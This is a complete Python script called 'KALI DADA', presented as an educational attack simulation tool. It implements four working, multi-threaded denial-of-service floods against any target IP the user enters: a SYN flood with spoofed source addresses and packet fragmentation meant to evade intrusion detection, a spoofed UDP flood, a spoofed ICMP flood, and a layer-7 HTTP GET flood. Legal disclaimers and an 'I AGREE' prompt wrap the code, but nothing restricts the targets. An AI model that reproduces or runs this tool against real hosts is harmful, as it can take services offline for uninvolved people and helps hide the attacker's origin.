#!/usr/bin/env python3
"""
===========================================================================
  KALI DADA — Advanced Cyber Attack Simulation Tool
===========================================================================
  Author  : Sujal Lamichhane
  Website : sujallamichhane.com.np

  ⚠  LEGAL DISCLAIMER
  This tool is strictly for EDUCATIONAL and CONTROLLED LAB environments.
  Running any of these attacks against a system without EXPLICIT WRITTEN
  AUTHORISATION is a criminal offence under:
    • Computer Fraud and Abuse Act (CFAA) — USA
    • Computer Misuse Act — UK
    • IT Act 2000 — Nepal / India
    • And equivalent laws worldwide.
  The author bears ZERO responsibility for any misuse.
===========================================================================

  Attack Modules:
    1. Advanced TCP SYN Flood   — Spoofed IPs, fragmented packets, multi-thread
    2. Advanced UDP Flood       — Variable-size payload, multi-thread
    3. ICMP Ping Flood          — ICMP echo request storm, multi-thread
    4. HTTP GET Flood           — Layer-7 application-layer flood

  Requires: Python 3.8+, Scapy, root / sudo
  Install : pip3 install scapy
===========================================================================
"""

import os
import sys
import time
import socket
import random
import threading
import argparse
import signal
import struct
from datetime import datetime

# ── Scapy import with graceful error ─────────────────────
try:
    from scapy.all import IP, TCP, UDP, ICMP, Raw, send, fragment, conf
    conf.verb = 0          # suppress per-packet Scapy output globally
    SCAPY_OK = True
except ImportError:
    SCAPY_OK = False

# ═══════════════════════════════════════════════════════════
#  ANSI COLOR PALETTE  (Hacker / Kali theme)
# ═══════════════════════════════════════════════════════════
class C:
    RED     = "\033[91m"
    GREEN   = "\033[92m"
    YELLOW  = "\033[93m"
    BLUE    = "\033[94m"
    MAGENTA = "\033[95m"
    CYAN    = "\033[96m"
    WHITE   = "\033[97m"
    BOLD    = "\033[1m"
    DIM     = "\033[2m"
    BLINK   = "\033[5m"
    RESET   = "\033[0m"

# ── Creator ───────────────────────────────────────────────
AUTHOR  = "Sujal Lamichhane"
WEBSITE = "sujallamichhane.com.np"

# ═══════════════════════════════════════════════════════════
#  SHARED ATTACK STATE
# ═══════════════════════════════════════════════════════════
packet_count  = [0]           # total packets/requests sent (shared across threads)
success_count = [0]           # successful sends
error_count   = [0]           # failed sends
count_lock    = threading.Lock()
stop_event    = threading.Event()   # set this to gracefully halt all threads


# ═══════════════════════════════════════════════════════════
#  DISPLAY HELPERS
# ═══════════════════════════════════════════════════════════

def clear():
    os.system("clear" if os.name != "nt" else "cls")


def print_warning():
    """Full-screen legal warning shown before anything else."""
    clear()
    print(f"""
{C.RED}{C.BOLD}
╔══════════════════════════════════════════════════════════════════════════════╗
║                      ⚠   L E G A L   W A R N I N G   ⚠                    ║
╠══════════════════════════════════════════════════════════════════════════════╣
║                                                                              ║
║  THIS TOOL IS FOR EDUCATIONAL AND AUTHORISED LAB USE ONLY.                  ║
║                                                                              ║
║  • Do NOT use this against any system you do not own or have written         ║
║    permission to test.                                                       ║
║  • Unauthorised use is a CRIMINAL OFFENCE in most jurisdictions.             ║
║  • The author accepts ZERO liability for misuse.                             ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
{C.RESET}""")
    time.sleep(3)


def print_banner():
    """Kali Dada ASCII art banner with author info."""
    clear()
    print(f"""{C.GREEN}{C.BOLD}
 /$$   /$$  /$$$$$$  /$$       /$$$$$$        /$$$$$$$   /$$$$$$  /$$$$$$$   /$$$$$$
| $$  /$$/ /$$__  $$| $$      |_  $$_/       | $$__  $$ /$$__  $$| $$__  $$ /$$__  $$
| $$ /$$/ | $$  \\$$| $$        | $$         | $$  \\ $$| $$  \\ $$| $$  \\ $$| $$  \\ $$
| $$$$$/  | $$$$$$$$| $$        | $$         | $$  | $$| $$$$$$$$| $$  | $$| $$$$$$$$
| $$  $$  | $$__  $$| $$        | $$         | $$  | $$| $$__  $$| $$  | $$| $$__  $$
| $$\\ $$  | $$  | $$| $$        | $$         | $$  | $$| $$  | $$| $$  | $$| $$  | $$
| $$ \\ $$| $$  | $$| $$$$$$$$ /$$$$$$       | $$$$$$$/| $$  | $$| $$$$$$$/| $$  | $$
|__/  \\__/|__/  |__/|________/|______/       |_______/ |__/  |__/|_______/ |__/  |__/
{C.RESET}""")

    print(f"  {C.CYAN}{'─'*74}{C.RESET}")
    print(f"  {C.WHITE}         Welcome to {C.GREEN}{C.BOLD}KALI DADA's{C.RESET}{C.WHITE} Advanced Cyber Attack Simulation Tool{C.RESET}")
    print(f"  {C.CYAN}{'─'*74}{C.RESET}")
    print(f"  {C.YELLOW}  Author  : {C.WHITE}{AUTHOR}{C.RESET}")
    print(f"  {C.YELLOW}  Website : {C.CYAN}{WEBSITE}{C.RESET}")
    print(f"  {C.YELLOW}  Purpose : {C.WHITE}Controlled Lab / Educational Demonstration{C.RESET}")
    print(f"  {C.CYAN}{'─'*74}{C.RESET}\n")
    time.sleep(0.8)


def section(title: str):
    """Print a formatted section header."""
    print(f"\n{C.BOLD}{C.CYAN}  ┌─ {title} {'─' * (56 - len(title))}┐{C.RESET}")


def log(level: str, msg: str):
    """Timestamped log line with colour-coded level."""
    ts = datetime.now().strftime("%H:%M:%S")
    colours = {"INFO": C.CYAN, "OK": C.GREEN, "WARN": C.YELLOW,
               "ERROR": C.RED, "ATTACK": C.MAGENTA, "STOP": C.YELLOW}
    colour = colours.get(level, C.WHITE)
    print(f"  {C.DIM}[{ts}]{C.RESET} {colour}{C.BOLD}[{level}]{C.RESET} {C.WHITE}{msg}{C.RESET}")


def progress_line(sent: int, ok: int, err: int, elapsed: float, pps: float):
    """Overwrite the current line with live stats (no newline)."""
    sys.stdout.write(
        f"\r  {C.CYAN}Sent:{C.GREEN} {sent:>8,} {C.RESET}"
        f"  {C.CYAN}OK:{C.GREEN} {ok:>7,} {C.RESET}"
        f"  {C.CYAN}Err:{C.RED} {err:>5,} {C.RESET}"
        f"  {C.CYAN}PPS:{C.YELLOW} {pps:>8.1f} {C.RESET}"
        f"  {C.CYAN}Time:{C.WHITE} {elapsed:>6.1f}s{C.RESET}  "
    )
    sys.stdout.flush()


# ═══════════════════════════════════════════════════════════
#  UTILITY
# ═══════════════════════════════════════════════════════════

def check_root():
    """Abort if not running as root (required for raw sockets / Scapy)."""
    if os.geteuid() != 0:
        log("ERROR", "This script must be run as root (sudo). Exiting.")
        sys.exit(1)


def check_scapy():
    """Abort if Scapy is unavailable for attacks that need it."""
    if not SCAPY_OK:
        log("ERROR", "Scapy is not installed. Run: pip3 install scapy")
        sys.exit(1)


def random_ipv4() -> str:
    """Generate a random non-private IPv4 address for source spoofing."""
    while True:
        ip = ".".join(str(random.randint(1, 254)) for _ in range(4))
        first = int(ip.split(".")[0])
        # Skip RFC 1918 private ranges and loopback
        if first not in (10, 127, 172, 192):
            return ip


def server_status(target_ip: str, port: int = 80) -> bool:
    """
    Quick TCP probe to check if the target is reachable.
    Returns True if a connection can be established within 2 seconds.
    """
    try:
        with socket.create_connection((target_ip, port), timeout=2):
            log("OK", f"Target {target_ip}:{port} is {C.GREEN}UP{C.RESET}")
            return True
    except Exception as e:
        log("WARN", f"Target {target_ip}:{port} appears DOWN ({e}) — continuing anyway")
        return False


def reset_counters():
    """Zero all shared counters before a new attack run."""
    stop_event.clear()
    with count_lock:
        packet_count[0]  = 0
        success_count[0] = 0
        error_count[0]   = 0


def live_stats_thread(start_time: float):
    """
    Background thread: prints a live progress line every 0.3 s
    until stop_event is set.
    """
    while not stop_event.is_set():
        elapsed = time.time() - start_time
        with count_lock:
            sent = packet_count[0]
            ok   = success_count[0]
            err  = error_count[0]
        pps = sent / elapsed if elapsed > 0 else 0
        progress_line(sent, ok, err, elapsed, pps)
        time.sleep(0.3)


def summary(attack_name: str, start_time: float):
    """Print the post-attack summary box."""
    elapsed = time.time() - start_time
    with count_lock:
        sent = packet_count[0]
        ok   = success_count[0]
        err  = error_count[0]
    pps = sent / elapsed if elapsed > 0 else 0

    print(f"\n\n{C.BOLD}{C.WHITE}  ┌─ {attack_name} — Summary {'─'*40}┐{C.RESET}")
    print(f"  {C.WHITE}│  Total Sent    : {C.GREEN}{sent:,}{C.RESET}")
    print(f"  {C.WHITE}│  Successful    : {C.GREEN}{ok:,}{C.RESET}")
    print(f"  {C.WHITE}│  Errors        : {C.RED}{err:,}{C.RESET}")
    print(f"  {C.WHITE}│  Duration      : {C.CYAN}{elapsed:.2f}s{C.RESET}")
    print(f"  {C.WHITE}│  Avg PPS       : {C.YELLOW}{pps:.1f} packets/sec{C.RESET}")
    print(f"  {C.BOLD}{C.WHITE}  └{'─'*60}┘{C.RESET}\n")


# ═══════════════════════════════════════════════════════════
#  ATTACK MODULE 1 — ADVANCED TCP SYN FLOOD
# ═══════════════════════════════════════════════════════════

def _syn_flood_worker(target_ip: str, target_port: int, end_time: float):
    """
    Worker thread for TCP SYN Flood.

    How it works:
      • Each iteration crafts a new TCP SYN packet with:
          - Spoofed random source IP (makes per-IP blocking ineffective)
          - Random source port
          - Random sequence number (mimics real TCP handshake initiation)
          - Real-world TCP options (MSS, SACK, Timestamps) — makes packets
            look legitimate to shallow firewalls
      • The packet is fragmented (fragsize=500 bytes) to attempt to
        bypass some IDS/IPS systems that inspect only the first fragment.
      • The server allocates a half-open connection entry for each SYN,
        filling its connection table → legitimate clients get refused.

    Security concept: SYN cookies (RFC 4987) are the primary defence
    against this attack on modern Linux kernels.
    """
    # Persistent L3 socket per thread — avoids per-packet socket open/close overhead
    try:
        sock = conf.L3socket()
    except Exception as e:
        log("ERROR", f"Failed to open raw socket: {e}")
        return

    while time.time() < end_time and not stop_event.is_set():
        try:
            src_ip    = random_ipv4()
            src_port  = random.randint(1024, 65535)
            seq_num   = random.randint(0, 2**32 - 1)
            window    = random.randint(1024, 65535)
            ts_val    = int(time.time())

            tcp_opts = [
                ("MSS",       1460),
                ("SAckOK",    b""),
                ("Timestamp", (ts_val, 0)),
                ("NOP",       None),
                ("WScale",    7),
            ]

            pkt = IP(src=src_ip, dst=target_ip) / TCP(
                sport=src_port,
                dport=target_port,
                flags="S",           # SYN only — no ACK → half-open
                seq=seq_num,
                window=window,
                options=tcp_opts,
            )

            # Fragment to evade shallow-inspection firewalls
            for frag in fragment(pkt, fragsize=500):
                sock.send(frag)

            with count_lock:
                packet_count[0]  += 1
                success_count[0] += 1

        except Exception:
            with count_lock:
                packet_count[0] += 1
                error_count[0]  += 1

    try:
        sock.close()
    except Exception:
        pass


def advanced_syn_flood(target_ip: str, target_port: int, duration: int, num_threads: int):
    """
    Launch a multi-threaded TCP SYN Flood attack.

    Args:
        target_ip:   victim IP
        target_port: victim TCP port
        duration:    attack length in seconds
        num_threads: number of concurrent flood threads
    """
    check_scapy()
    reset_counters()

    section("TCP SYN FLOOD ATTACK")
    log("ATTACK", f"Target: {target_ip}:{target_port}  |  Threads: {num_threads}  |  Duration: {duration}s")
    log("INFO",   "Technique: Spoofed SYN + IP fragmentation → fills half-open connection table")
    log("INFO",   "Defence:   SYN cookies, SYN rate limiting, stateful firewall")

    end_time   = time.time() + duration
    start_time = time.time()

    threads = [
        threading.Thread(target=_syn_flood_worker, args=(target_ip, target_port, end_time), daemon=True)
        for _ in range(num_threads)
    ]
    stats_t = threading.Thread(target=live_stats_thread, args=(start_time,), daemon=True)

    for t in threads: t.start()
    stats_t.start()
    for t in threads: t.join()

    stop_event.set()
    summary("TCP SYN Flood", start_time)


# ═══════════════════════════════════════════════════════════
#  ATTACK MODULE 2 — ADVANCED UDP FLOOD
# ═══════════════════════════════════════════════════════════

def _udp_flood_worker(target_ip: str, target_port: int, end_time: float, use_scapy: bool):
    """
    Worker thread for UDP Flood.

    Two modes:
      • Scapy mode  : raw crafted UDP packets with spoofed source IPs.
      • Socket mode : faster, uses OS UDP socket without spoofing.

    How it works:
      • Sends random-length (64–1500 byte) UDP datagrams continuously.
      • Target's UDP processing stack is overwhelmed; if the port is
        open, the application itself exhausts CPU/memory.
      • If the port is closed, the target sends ICMP Port Unreachable
        replies, consuming bandwidth in both directions.

    Security concept: Stateless UDP makes filtering harder; defended
    by ingress filtering (BCP38), rate limiting per source IP.
    """
    if use_scapy:
        # Persistent L3 socket per thread for maximum throughput
        try:
            sock = conf.L3socket()
        except Exception as e:
            log("ERROR", f"Failed to open raw socket: {e}")
            return

        while time.time() < end_time and not stop_event.is_set():
            try:
                src_ip   = random_ipv4()
                src_port = random.randint(1024, 65535)
                payload  = os.urandom(random.randint(64, 1400))   # os.urandom is faster

                pkt = IP(src=src_ip, dst=target_ip) / UDP(
                    sport=src_port, dport=target_port
                ) / Raw(load=payload)

                sock.send(pkt)

                with count_lock:
                    packet_count[0]  += 1
                    success_count[0] += 1

            except Exception:
                with count_lock:
                    packet_count[0] += 1
                    error_count[0]  += 1

        try:
            sock.close()
        except Exception:
            pass
    else:
        # Faster OS-socket path (no spoofing, but higher throughput)
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setblocking(False)
        except Exception as e:
            log("ERROR", f"UDP socket creation failed: {e}")
            return

        target = (target_ip, target_port)
        while time.time() < end_time and not stop_event.is_set():
            try:
                sock.sendto(os.urandom(random.randint(64, 1500)), target)
                with count_lock:
                    packet_count[0]  += 1
                    success_count[0] += 1
            except BlockingIOError:
                pass   # send buffer full — skip and retry immediately
            except Exception:
                with count_lock:
                    packet_count[0] += 1
                    error_count[0]  += 1

        sock.close()


def advanced_udp_flood(target_ip: str, target_port: int, duration: int, num_threads: int, spoofed: bool = True):
    """
    Launch a multi-threaded UDP flood attack.

    Args:
        target_ip:   victim IP
        target_port: victim UDP port
        duration:    attack length in seconds
        num_threads: number of concurrent flood threads
        spoofed:     True = use Scapy with spoofed IPs (requires root)
    """
    if spoofed:
        check_scapy()
    reset_counters()

    section("UDP FLOOD ATTACK")
    log("ATTACK", f"Target: {target_ip}:{target_port}  |  Threads: {num_threads}  |  Duration: {duration}s  |  Spoofed: {spoofed}")
    log("INFO",   "Technique: Random-size UDP datagrams, optional IP spoofing")
    log("INFO",   "Defence:   Ingress rate-limiting, BCP38 anti-spoofing, upstream scrubbing")

    end_time   = time.time() + duration
    start_time = time.time()

    threads = [
        threading.Thread(target=_udp_flood_worker, args=(target_ip, target_port, end_time, spoofed), daemon=True)
        for _ in range(num_threads)
    ]
    stats_t = threading.Thread(target=live_stats_thread, args=(start_time,), daemon=True)

    for t in threads: t.start()
    stats_t.start()
    for t in threads: t.join()

    stop_event.set()
    summary("UDP Flood", start_time)


# ═══════════════════════════════════════════════════════════
#  ATTACK MODULE 3 — ICMP PING FLOOD
# ═══════════════════════════════════════════════════════════

def _icmp_flood_worker(target_ip: str, end_time: float):
    """
    Worker thread: send ICMP Echo Request (ping) packets continuously.

    How it works:
      • Each packet is a standard ICMP Echo Request (type=8).
      • Payload is random to prevent compression/dedup by network gear.
      • Overwhelms the target's ICMP processing and consumes bandwidth.
      • Source IPs are spoofed so block-by-source is ineffective.

    Security concept: Defended by ICMP rate limiting or complete ICMP
    blocking at the perimeter firewall.
    """
    # Persistent L3 socket per thread
    try:
        sock = conf.L3socket()
    except Exception as e:
        log("ERROR", f"Failed to open raw socket: {e}")
        return

    while time.time() < end_time and not stop_event.is_set():
        try:
            src_ip  = random_ipv4()
            seq_num = random.randint(0, 65535)
            payload = os.urandom(random.randint(56, 1400))

            pkt = IP(src=src_ip, dst=target_ip) / ICMP(
                type=8,    # Echo Request
                code=0,
                seq=seq_num,
            ) / Raw(load=payload)

            sock.send(pkt)

            with count_lock:
                packet_count[0]  += 1
                success_count[0] += 1

        except Exception:
            with count_lock:
                packet_count[0] += 1
                error_count[0]  += 1

    try:
        sock.close()
    except Exception:
        pass


def icmp_ping_flood(target_ip: str, duration: int, num_threads: int):
    """
    Launch a multi-threaded ICMP Ping Flood.

    Args:
        target_ip:   victim IP
        duration:    attack length in seconds
        num_threads: number of concurrent flood threads
    """
    check_scapy()
    reset_counters()

    section("ICMP PING FLOOD ATTACK")
    log("ATTACK", f"Target: {target_ip}  |  Threads: {num_threads}  |  Duration: {duration}s")
    log("INFO",   "Technique: High-rate ICMP Echo Requests with spoofed source IPs")
    log("INFO",   "Defence:   ICMP rate limiting, 'no ip directed-broadcast', firewall rules")

    end_time   = time.time() + duration
    start_time = time.time()

    threads = [
        threading.Thread(target=_icmp_flood_worker, args=(target_ip, end_time), daemon=True)
        for _ in range(num_threads)
    ]
    stats_t = threading.Thread(target=live_stats_thread, args=(start_time,), daemon=True)

    for t in threads: t.start()
    stats_t.start()
    for t in threads: t.join()

    stop_event.set()
    summary("ICMP Ping Flood", start_time)


# ═══════════════════════════════════════════════════════════
#  ATTACK MODULE 4 — HTTP GET FLOOD (Layer 7)
# ═══════════════════════════════════════════════════════════

def _http_flood_worker(target_ip: str, target_port: int, end_time: float):
    """
    Worker thread: open TCP connections and send HTTP GET requests.

    How it works:
      • Sends rapid HTTP GET requests to a random path on every iteration.
      • Randomising path/User-Agent defeats simple signature-based filters.
      • This is a Layer-7 (application layer) attack — packets look like
        legitimate web traffic to L3/L4 firewalls.

    Security concept: WAF (Web Application Firewall), CAPTCHA,
    rate-limiting by IP, and JS challenge pages are the primary defences.
    """
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605",
        "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101",
        "curl/7.81.0",
        "python-requests/2.28.0",
        "Go-http-client/1.1",
    ]

    while time.time() < end_time and not stop_event.is_set():
        sock = None
        try:
            path = "/" + "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=12))
            ua   = random.choice(user_agents)

            request = (
                f"GET {path} HTTP/1.1\r\n"
                f"Host: {target_ip}\r\n"
                f"User-Agent: {ua}\r\n"
                f"Accept: text/html,application/xhtml+xml,*/*\r\n"
                f"Accept-Language: en-US,en;q=0.9\r\n"
                f"Connection: close\r\n\r\n"
            ).encode()

            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((target_ip, target_port))
            sock.sendall(request)

            with count_lock:
                packet_count[0]  += 1
                success_count[0] += 1

        except Exception:
            with count_lock:
                packet_count[0] += 1
                error_count[0]  += 1
        finally:
            if sock:
                try:
                    sock.close()
                except Exception:
                    pass


def http_get_flood(target_ip: str, target_port: int, duration: int, num_threads: int):
    """
    Launch a multi-threaded HTTP GET flood (Layer 7).

    Args:
        target_ip:   victim IP
        target_port: victim HTTP port (usually 80 or 8080)
        duration:    attack length in seconds
        num_threads: number of concurrent flood threads
    """
    reset_counters()

    section("HTTP GET FLOOD ATTACK (Layer 7)")
    log("ATTACK", f"Target: http://{target_ip}:{target_port}/  |  Threads: {num_threads}  |  Duration: {duration}s")
    log("INFO",   "Technique: Randomised GET requests mimicking legitimate browser traffic")
    log("INFO",   "Defence:   WAF, CAPTCHA, JS challenge, rate limiting, Cloudflare Bot Fight")

    end_time   = time.time() + duration
    start_time = time.time()

    threads = [
        threading.Thread(target=_http_flood_worker, args=(target_ip, target_port, end_time), daemon=True)
        for _ in range(num_threads)
    ]
    stats_t = threading.Thread(target=live_stats_thread, args=(start_time,), daemon=True)

    for t in threads: t.start()
    stats_t.start()
    for t in threads: t.join()

    stop_event.set()
    summary("HTTP GET Flood", start_time)


# ═══════════════════════════════════════════════════════════
#  MENU SYSTEM
# ═══════════════════════════════════════════════════════════

MENU = {
    "1": ("Advanced TCP SYN Flood", "Layer 3/4 — Fills half-open connection table (Scapy, requires root)"),
    "2": ("Advanced UDP Flood",     "Layer 3/4 — High-volume UDP datagrams with optional spoofing"),
    "3": ("ICMP Ping Flood",        "Layer 3   — ICMP Echo Request storm with spoofed IPs (Scapy)"),
    "4": ("HTTP GET Flood",         "Layer 7   — Application-layer flood with randomised requests"),
    "5": ("Exit",                   "Quit the tool"),
}


def print_menu():
    """Display the attack selection menu."""
    print(f"\n{C.BOLD}{C.WHITE}  ┌─ Attack Selection Menu {'─'*48}┐{C.RESET}")
    for key, (name, desc) in MENU.items():
        if key == "5":
            print(f"  {C.DIM}  {'─'*60}{C.RESET}")
            print(f"  {C.YELLOW}  [{key}] {name}{C.RESET}")
        else:
            print(f"  {C.CYAN}  [{key}] {C.WHITE}{C.BOLD}{name}{C.RESET}")
            print(f"  {C.DIM}       {desc}{C.RESET}")
    print(f"  {C.BOLD}{C.WHITE}  └{'─'*60}┘{C.RESET}\n")


def get_int(prompt: str, default: int = None, min_val: int = 1, max_val: int = 65535) -> int:
    """Prompt for an integer with validation and optional default."""
    while True:
        raw = input(f"  {C.CYAN}{prompt}{C.RESET}").strip()
        if raw == "" and default is not None:
            return default
        try:
            val = int(raw)
            if min_val <= val <= max_val:
                return val
            print(f"  {C.RED}[!] Enter a value between {min_val} and {max_val}{C.RESET}")
        except ValueError:
            print(f"  {C.RED}[!] Invalid number. Try again.{C.RESET}")


def get_str(prompt: str, default: str = None) -> str:
    """Prompt for a string with optional default."""
    raw = input(f"  {C.CYAN}{prompt}{C.RESET}").strip()
    return raw if raw else (default or "")


def run_menu():
    """Main interactive loop."""
    while True:
        print_menu()
        choice = get_str(f"Select an option [1-{len(MENU)}]: ").strip()

        if choice not in MENU:
            log("ERROR", "Invalid choice. Please enter a number from the menu.")
            continue

        if choice == "5":
            log("INFO", "Goodbye!")
            sys.exit(0)

        # ── Common inputs ─────────────────────────────────
        target_ip = get_str("Target IP address: ")
        if not target_ip:
            log("ERROR", "Target IP cannot be empty.")
            continue

        # ── Attack-specific inputs ────────────────────────
        if choice == "1":   # SYN Flood
            port     = get_int("Target port [default 80]: ", default=80, min_val=1, max_val=65535)
            duration = get_int("Duration (seconds) [default 30]: ", default=30, min_val=1, max_val=3600)
            threads  = get_int("Number of threads [default 5]: ",  default=5,  min_val=1, max_val=500)
            server_status(target_ip, port)
            advanced_syn_flood(target_ip, port, duration, threads)

        elif choice == "2": # UDP Flood
            port     = get_int("Target port [default 53]: ",        default=53,  min_val=1, max_val=65535)
            duration = get_int("Duration (seconds) [default 30]: ", default=30,  min_val=1, max_val=3600)
            threads  = get_int("Number of threads [default 5]: ",   default=5,   min_val=1, max_val=500)
            spoofed_raw = get_str("Spoof source IPs? (requires Scapy/root) [y/n, default y]: ", default="y")
            spoofed = spoofed_raw.lower() != "n"
            server_status(target_ip, port)
            advanced_udp_flood(target_ip, port, duration, threads, spoofed)

        elif choice == "3": # ICMP Flood
            duration = get_int("Duration (seconds) [default 30]: ", default=30, min_val=1, max_val=3600)
            threads  = get_int("Number of threads [default 5]: ",   default=5,  min_val=1, max_val=500)
            server_status(target_ip, 80)
            icmp_ping_flood(target_ip, duration, threads)

        elif choice == "4": # HTTP GET Flood
            port     = get_int("Target port [default 80]: ",        default=80, min_val=1, max_val=65535)
            duration = get_int("Duration (seconds) [default 30]: ", default=30, min_val=1, max_val=3600)
            threads  = get_int("Number of threads [default 20]: ",  default=20, min_val=1, max_val=1000)
            server_status(target_ip, port)
            http_get_flood(target_ip, port, duration, threads)

        # ── Continue prompt ───────────────────────────────
        again = get_str("\n  Run another attack? [y/n, default y]: ", default="y")
        if again.lower() == "n":
            log("INFO", "Exiting. Stay ethical!")
            break

        print_banner()


# ═══════════════════════════════════════════════════════════
#  SIGNAL HANDLER
# ═══════════════════════════════════════════════════════════

def _handle_sigint(sig, frame):
    """Allow Ctrl-C to stop the current attack gracefully."""
    stop_event.set()
    print(f"\n\n  {C.YELLOW}[!] Ctrl-C received — stopping current attack...{C.RESET}")
    time.sleep(0.5)
    # Don't exit; return to menu so the user can choose again


signal.signal(signal.SIGINT, _handle_sigint)


# ═══════════════════════════════════════════════════════════
#  ENTRY POINT
# ═══════════════════════════════════════════════════════════

def main():
    print_warning()
    print_banner()

    # Safety confirmation gate — re-prompt until user confirms
    print(f"  {C.RED}{C.BOLD}⚠  CONFIRMATION REQUIRED{C.RESET}")
    print(f"  {C.WHITE}You must confirm this is a controlled lab environment.")
    print(f"  Unauthorised use against real targets is illegal.{C.RESET}\n")
    while True:
        confirm = input(f"  {C.YELLOW}Type 'I AGREE' to continue: {C.RESET}").strip()
        if confirm.upper() == "I AGREE":
            break
        print(f"  {C.RED}[!] Please type 'I AGREE' (case-insensitive) to proceed.{C.RESET}")

    check_root()

    if not SCAPY_OK:
        log("WARN", "Scapy not found — SYN Flood, ICMP Flood, and spoofed UDP will be unavailable.")
        log("WARN", "Install with: pip3 install scapy")

    print_banner()
    run_menu()


if __name__ == "__main__":
    main()
